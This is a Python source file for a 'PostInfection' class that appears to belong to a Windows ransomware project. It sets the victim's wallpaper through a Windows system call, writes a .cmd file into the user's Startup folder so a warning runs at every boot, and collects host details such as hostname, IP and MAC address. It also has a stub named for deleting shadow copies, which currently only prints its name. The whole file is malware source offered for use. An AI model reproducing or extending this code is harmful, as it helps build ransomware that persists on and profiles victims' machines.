import os
import ctypes
from shutil import copyfile

from utils import resourcePath
class PostInfection(object):

    def __init__(self):
        print("PostInfection Object Created")
        self.wallpaper_path = resourcePath("wallpaper.png",["images"])   
        print("Wallpaper :", self.wallpaper_path)
    
    def changeWallpaper(self):

        _status = ctypes.windll.user32.SystemParametersInfoW(0x14, 0, self.wallpaper_path, 0x2)
        if _status:
            print("Wallpaper has been changed")
        else:
            print("The problem has occured on changing wallpaper")

    def deleteShadowFiles(self):
        print("deleteShadowFiles")
    
    def setItselfStartUpApplication(self, keyspath):
        """
            create autorun program to display a warning message each time a computer is turned on
        """
        
        # TODO: try-except for KeyError
        # get startup location
        _startup_location = os.environ["USERPROFILE"]+"\\AppData\\Roaming\\Microsoft\\Windows\\Start Menu\\Programs\\Startup"
        #_startup_location_2 = os.environ["APPDATA"]+"\\Microsoft\\Windows\\Start Menu\\Programs\\StartUp"

        # prevent from overwriting
        _file_count = str(len(os.listdir(_startup_location)))
        _autorun_file_path = os.path.join(_startup_location,_file_count+"authrun.cmd")
        
        # creaing autorun script
        with open(_autorun_file_path,"w") as autorunfile:
            autorunfile.write(keyspath)

    def getSystemInfo(self):
        import platform,socket,re,uuid,psutil
        try:
            info={}
            info['platform']=platform.system()
            info['platform-release']=platform.release()
            info['platform-version']=platform.version()
            info['architecture']=platform.machine()
            info['hostname']=socket.gethostname()
            info['ip-address']=socket.gethostbyname(socket.gethostname())
            info['mac-address']=':'.join(re.findall('..', '%012x' % uuid.getnode()))
            info['processor']=platform.processor()
            info['ram']=str(round(psutil.virtual_memory().total / (1024.0**3)))+" GB"
            return info
        except Exception as e:
            print("Problem Has Been Occured When Information Gathering")


pi = PostInfection()
print(pi.getSystemInfo())